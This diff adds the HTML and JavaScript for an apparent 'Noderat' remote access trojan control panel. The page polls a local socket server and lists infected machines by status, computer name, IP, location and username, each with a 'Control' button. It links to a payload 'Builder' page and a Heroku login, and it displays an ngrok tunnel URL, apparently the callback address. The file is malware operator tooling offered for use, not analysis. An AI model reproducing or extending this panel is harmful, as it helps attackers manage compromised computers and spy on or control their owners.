@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Noderat control panel v0.4</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="index.css">
+    <script src="/get_socket.io.js"></script>
+  </head>
+  <body>
+    <a style="position: relative; top: 55px;" target="_blank" href="./"><h1>Users</h1></a>
+    <a style="position: relative;left: 150px; " target="_blank" href="./builder"><h1>Builder</h1></a>
+    <a style="position: relative;left: 350px; top: -55px;" target="_blank" href="http://boiling-plains-03769.herokuapp.com/api/control"><h1>Login</h1></a>
+    <input type="text" style="position: absolute;left: -1500px; " id="ngrok_url">
+    <!-- <a style="position: relative; left: 150px;" target="_blank" href="http://boiling-plains-03769.herokuapp.com/api/control"><h1>boiling-plains-03769</h1></a> -->
+    <a style="position: relative; top:-50px;" target="_self" href="#" style="position: absolute;"><h1 onclick="var el=document.getElementById('ngrok_url');el.select();navigator.clipboard.writeText(el.value);" id="ngrok" style="width:700px">loading...</h1></a>
+    <table class="table">
+    <thead class="thead-dark" style="border-collapse:collapse;border-spacing:0;">
+        <tr>
+          <th scope="col">
+            Status
+          </th>
+          <th scope="col">
+            Computer Name
+          </th>
+          <th scope="col">
+            IP
+          </th>
+          <th scope="col">
+            Country And City
+          </th>
+          <th scope="col">
+            Username
+          </th>
+          <th scope="col">
+            Control
+          </th>
+        </tr>"
+      </thead>
+      <tbody id="userstbl">
+       
+      </tbody>
+  </table>
+    <script>
+      forkvp = (obj,callback) => {
+    var objentries = Object.entries(obj)
+    var returnarray = []
+    for (let index = 0; index < objentries.length; index++) {
+        //console.log(objentries[index])
+        
+        returnarray[returnarray.length] = callback(objentries[index][0],objentries[index][1])
+        
+    
+    }
+    return returnarray
+}
+      var socket=io('http://localhost:65352')
+      window.onload = ()=>{
+      
+      socket.emit('appready',1)
+         updateUsersTbl = (data)=>{
+          data=JSON.parse(data)
+          var userstr = ''
+          //console.log("updating users...")
+        forkvp(data,(k,v)=>{
+        var clr=v.status=='Online'?'#009b22':'#9b0022'
+        userstr = userstr+ "<tr><th style='color:"+clr+"'>" + v.status +
+        "</th><th>" +
+          v.pcname +
+        "</th><th>" +
+          v.IP +
+          "</th><th>" +
+          v.cac +
+        "</th><th>" +
+          v.curuname + 
+            '</th><th><a href="#" class="usermngbtn"><button onclick="socket.emit(\'usercontrolmenuopen\',\''+
+            v.pcname+'\')" type="button" class="btn btn-success">Control</button></a></th></tr>'
+        
+        })
+        //console.log(userstr)
+        document.getElementById("userstbl").innerHTML=userstr
+          
+      }
+      socket.on("ut",updateUsersTbl)
+      setInterval(()=>{
+        socket.emit('get_ut')
+      },2000)
+      socket.emit('get_ngrok')
+      socket.on("ngrok_url",url=>{document.getElementById("ngrok").innerText=url;document.getElementById("ngrok_url").value=url})
+      socket.on('usercontrolmenuopen_result',s=>s==0?alert('this user is not connected'):1)
+      
+    }
+    </script>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+</html>
